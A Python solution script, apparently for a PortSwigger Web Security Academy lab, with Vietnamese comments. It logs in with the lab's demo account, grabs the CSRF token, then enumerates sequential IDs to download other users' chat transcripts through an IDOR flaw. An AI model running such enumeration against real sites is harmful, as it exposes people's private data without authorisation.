import requests
import time
import re

def scrape_transcripts():
    BASE_URL = "https://0a88001403677a9580994efb005a0098.web-security-academy.net"
    USERNAME = "wiener"
    PASSWORD = "peter"

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
    })

    login_page = session.get(f"{BASE_URL}/login")
    csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)

    if csrf_match:
        csrf_token = csrf_match.group(1)
        login_data = {
            'username': USERNAME,
            'password': PASSWORD,
            'csrf': csrf_token
        }

        login_response = session.post(f"{BASE_URL}/login", data=login_data)

        if 'Log out' in login_response.text:
            print("✅ Đăng nhập thành công!")
        else:
            print("❌ Đăng nhập thất bại")
            return
    else:
        print("❌ Không tìm thấy CSRF token")
        return 
    
    for file_id in range(1, 21): 
        try:
            # Xác định được URL bị IDOR
            url = f"{BASE_URL}/download-transcript/{file_id}.txt"
            response = session.get(url)
            
            if response.status_code == 200:
                print(f"✅ {file_id}.txt: {len(response.text)} ký tự")
                
                # Lưu file
                with open(f"{file_id}.txt", "w", encoding="utf-8") as f:
                    f.write(response.text)         
            else:
                print(f"{file_id}.txt: Status {response.status_code}")
                
        except Exception as e:
            print(f"Lỗi với {file_id}.txt: {e}")
        
        time.sleep(0.5)
    
    print("\n✅ Hoàn thành!")

if __name__ == "__main__":
    scrape_transcripts() 